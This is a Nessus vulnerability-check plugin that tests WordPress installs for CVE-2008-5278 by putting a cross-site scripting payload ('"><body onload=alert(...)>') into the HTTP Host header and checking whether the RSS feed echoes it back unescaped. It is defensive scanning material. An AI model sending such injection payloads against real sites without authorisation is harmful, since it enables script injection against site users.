#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(34994);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2008-5278");
  script_bugtraq_id(32476);
  script_xref(name:"OSVDB", value:"50214");
  script_xref(name:"Secunia", value:"32882");

  script_name(english:"WordPress wp-includes/feed.php self_link() Function Host Header RSS Feed XSS");
  script_summary(english:"Tries to influence absolute URL in the RSS2 feed output");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host fails to
completely sanitize input to the the 'Host' request header before
using it in the 'self_link()' function in 'wp-includes/feed.php' to
generate dynamic HTML output.  An attacker may be able to leverage
this to inject arbitrary HTML and script code into a user's browser to
be executed within the security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/498652/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://wordpress.org/development/2008/11/wordpress-265/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 2.6.5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Unless we're paranoid, make sure it's Apache.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Apache" >!< banner) exit(0);
}


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Figure out how to call the RSS feed, which is included in the HTML header.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  head = res - strstr(res, '</head>');

  url = string(dir, "/wp-rss2.php");
  if ('type="application/rss+xml"' >< head)
  {
    foreach line (split(head, keep:FALSE))
    {
      if ('type="application/rss+xml"' >< line)
      {
        href = strstr(line, ' href="') - ' href="';
        href = href - strstr(href, '"');

        href = strstr(href, '//') - '//';
        href = strstr(href, '/');

        if (stridx(href, dir) == 0)
        {
          url = href;
          break;
        }
      }
    }
  }

  exploit = string(SCRIPT_NAME, '"><body onload=alert(String.fromCharCode(88,83,83))>');

  req = http_mk_get_req(
    port : port, 
    item : url,
    add_headers : make_array("Host", exploit)
  );
  res = http_send_recv_req(port:port, req:req);
  if (res == NULL) exit(0);

  # There's a problem if we see our (escaped) exploit in the atom link.
  esc_exploit = ereg_replace(pattern:'"', replace:'\\"', string:exploit);
  if (string('<atom:link href="http://', esc_exploit) >< res[2])
  {
    if (report_verbosity)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report = string(
        "\n",
        "Nessus was able to exploit the issue using the following request :\n",
        "\n",
        "  ", str_replace(find:'\r\n', replace:'\n  ', string:req_str), "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

    exit(0);
  }
}
